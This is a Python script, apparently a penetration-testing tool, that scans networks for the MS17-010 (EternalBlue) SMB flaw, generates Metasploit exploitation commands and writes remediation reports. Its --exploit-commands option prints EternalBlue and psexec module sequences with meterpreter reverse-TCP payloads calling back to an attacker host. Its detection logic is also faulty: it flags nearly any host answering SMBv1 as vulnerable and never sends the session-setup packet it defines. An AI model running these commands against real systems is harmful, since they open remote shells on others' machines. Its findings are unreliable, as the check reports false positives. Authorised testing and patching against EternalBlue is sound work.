#!/usr/bin/env python3
"""
MS17-010 EternalBlue Scanner and Reporter

Scans for MS17-010 vulnerability and generates reports:
- SMB version detection
- MS17-010 vulnerability checking via SMB negotiation
- Exploitation command generation
- Assessment report generation

Usage:
    python process.py --scan 10.0.0.0/24 --output scan_results.json
    python process.py --check 10.0.0.1 --verbose
    python process.py --report scan_results.json --output report.md

Requirements:
    pip install impacket rich
"""

import argparse
import ipaddress
import json
import socket
import struct
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress
except ImportError:
    print("[!] Missing dependencies. Install with: pip install rich")
    sys.exit(1)

console = Console()

# SMB negotiation packet for MS17-010 detection
SMB_NEGOTIATE = bytes.fromhex(
    "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000"
    "006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e"
    "3000024e54204c414e4d414e20312e30000257696e646f777320666f7220576f726b6772"
    "6f75707320332e316100024c4d312e32583030320002"
    "4c414e4d414e322e3100024e54204c4d20302e313200"
)

# SMB session setup for MS17-010 tree connect check
SMB_SESSION_SETUP = bytes.fromhex(
    "00000088ff534d4273000000001807c00000000000000000000000000000fffe0000"
    "4000000dff00000000000000000000000000004a000000000044000200013a0000"
    "4e544c4d53535000010000000732000006000600330000000b000b0028000000"
    "050093080000000f574f524b53544154494f4e"
)


def check_ms17_010(ip: str, port: int = 445, timeout: int = 5) -> dict:
    """Check if a host is vulnerable to MS17-010."""
    result = {
        "ip": ip,
        "port": port,
        "smb_open": False,
        "vulnerable": False,
        "os_info": "",
        "error": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        result["smb_open"] = True

        # Send SMB negotiate
        sock.send(SMB_NEGOTIATE)
        response = sock.recv(4096)

        if len(response) > 36:
            # Check SMB header for response
            if response[4:8] == b'\xffSMB':
                result["os_info"] = "SMBv1 supported"

                # Check dialect index for SMBv1 support
                dialect_index = struct.unpack('<H', response[37:39])[0] if len(response) > 39 else 0

                # Basic vulnerability check based on SMBv1 support
                # A proper check requires tree connect to IPC$ and transaction request
                if dialect_index < 0xFFFF:
                    result["vulnerable"] = True
                    result["os_info"] = "SMBv1 enabled - potentially vulnerable (confirm with Nmap/Metasploit)"

        sock.close()

    except socket.timeout:
        result["error"] = "Connection timeout"
    except ConnectionRefusedError:
        result["error"] = "Connection refused"
    except OSError as e:
        result["error"] = str(e)

    return result


def scan_network(network: str, port: int = 445, threads: int = 50, timeout: int = 5) -> list[dict]:
    """Scan network range for MS17-010 vulnerability."""
    results = []

    try:
        targets = list(ipaddress.ip_network(network, strict=False).hosts())
    except ValueError as e:
        console.print(f"[red][-] Invalid network: {e}[/red]")
        return results

    console.print(f"[yellow][*] Scanning {len(targets)} hosts on port {port}...[/yellow]")

    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning...", total=len(targets))

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(check_ms17_010, str(ip), port, timeout): str(ip)
                for ip in targets
            }

            for future in as_completed(futures):
                result = future.result()
                if result["smb_open"]:
                    results.append(result)
                    if result["vulnerable"]:
                        console.print(f"[red][!] VULNERABLE: {result['ip']}[/red]")
                    else:
                        console.print(f"[green][+] SMB open: {result['ip']}[/green]")
                progress.update(task, advance=1)

    return results


def generate_exploit_commands(target_ip: str) -> dict:
    """Generate exploitation commands for a vulnerable host."""
    commands = {
        "metasploit_eternalblue": [
            "msfconsole",
            "use exploit/windows/smb/ms17_010_eternalblue",
            f"set RHOSTS {target_ip}",
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "set LHOST <ATTACKER_IP>",
            "set LPORT 443",
            "exploit",
        ],
        "metasploit_psexec": [
            "use exploit/windows/smb/ms17_010_psexec",
            f"set RHOSTS {target_ip}",
            "set PAYLOAD windows/meterpreter/reverse_tcp",
            "set LHOST <ATTACKER_IP>",
            "exploit",
        ],
        "nmap_verification": [
            f"nmap -p 445 --script smb-vuln-ms17-010 {target_ip}",
            f"nmap -p 445 --script smb-protocols {target_ip}",
        ],
        "crackmapexec": [
            f"crackmapexec smb {target_ip} -M ms17-010",
        ],
    }
    return commands


def generate_report(scan_results: list[dict], output_path: str):
    """Generate MS17-010 assessment report."""
    vulnerable = [r for r in scan_results if r.get("vulnerable")]
    smb_open = [r for r in scan_results if r.get("smb_open")]

    report = f"""# MS17-010 (EternalBlue) Vulnerability Assessment
## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---

## 1. Executive Summary

Scanned network for MS17-010 (EternalBlue) vulnerability affecting SMBv1.
**{len(vulnerable)}** potentially vulnerable hosts identified out of
**{len(smb_open)}** hosts with SMB port 445 open.

**Risk Level:** {"CRITICAL" if vulnerable else "LOW"}

## 2. Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2017-0143 through CVE-2017-0148 |
| CVSS | 9.3 (Critical) |
| Bulletin | MS17-010 |
| Protocol | SMBv1 |
| Impact | Remote Code Execution (SYSTEM) |
| Patch Available | Yes (March 2017) |

## 3. Scan Results

### Potentially Vulnerable Hosts

| IP Address | Port | OS Info | Status |
|-----------|------|---------|--------|
"""
    for r in vulnerable:
        report += f"| {r['ip']} | {r['port']} | {r.get('os_info', 'N/A')} | VULNERABLE |\n"

    report += """
### SMB Open (Not Vulnerable or Patched)

| IP Address | Port | Notes |
|-----------|------|-------|
"""
    for r in smb_open:
        if not r.get("vulnerable"):
            report += f"| {r['ip']} | {r['port']} | {r.get('os_info', 'Patched or SMBv1 disabled')} |\n"

    report += f"""
## 4. Recommendations

### Immediate Actions
1. Apply MS17-010 patches to all vulnerable systems immediately
2. Disable SMBv1 protocol on all systems where not required
3. Block SMB port 445 at network perimeter

### Commands to Disable SMBv1
```powershell
# Windows Server 2012 R2+
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Windows 10/Server 2016+
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Group Policy
# Computer Configuration > Admin Templates > Network > Lanman Server
# Set "SMB1" to Disabled
```

## 5. MITRE ATT&CK Mapping
- T1210 - Exploitation of Remote Services
- T1190 - Exploit Public-Facing Application
"""

    out = Path(output_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w") as f:
        f.write(report)

    console.print(f"[green][+] Report saved to: {output_path}[/green]")


def main():
    parser = argparse.ArgumentParser(description="MS17-010 EternalBlue Scanner")
    parser.add_argument("--scan", help="Network range to scan (CIDR notation)")
    parser.add_argument("--check", help="Check single host")
    parser.add_argument("--threads", type=int, default=50, help="Scan threads")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout")
    parser.add_argument("--exploit-commands", help="Generate exploit commands for IP")
    parser.add_argument("--report", help="Generate report from scan results JSON")
    parser.add_argument("--output", default="./ms17010_report.md", help="Output path")

    args = parser.parse_args()

    if args.check:
        result = check_ms17_010(args.check, timeout=args.timeout)
        table = Table(title=f"MS17-010 Check: {args.check}")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")
        for k, v in result.items():
            table.add_row(k, str(v))
        console.print(table)

    elif args.scan:
        results = scan_network(args.scan, threads=args.threads, timeout=args.timeout)

        # Save results
        json_path = args.output.replace(".md", ".json")
        with open(json_path, "w") as f:
            json.dump(results, f, indent=2)
        console.print(f"[green][+] Scan results saved to: {json_path}[/green]")

        generate_report(results, args.output)

    elif args.exploit_commands:
        commands = generate_exploit_commands(args.exploit_commands)
        for method, cmds in commands.items():
            console.print(Panel("\n".join(cmds), title=method))

    elif args.report:
        with open(args.report) as f:
            results = json.load(f)
        generate_report(results, args.output)

    else:
        console.print("[yellow]Use --scan <CIDR>, --check <IP>, or --exploit-commands <IP>[/yellow]")


if __name__ == "__main__":
    main()
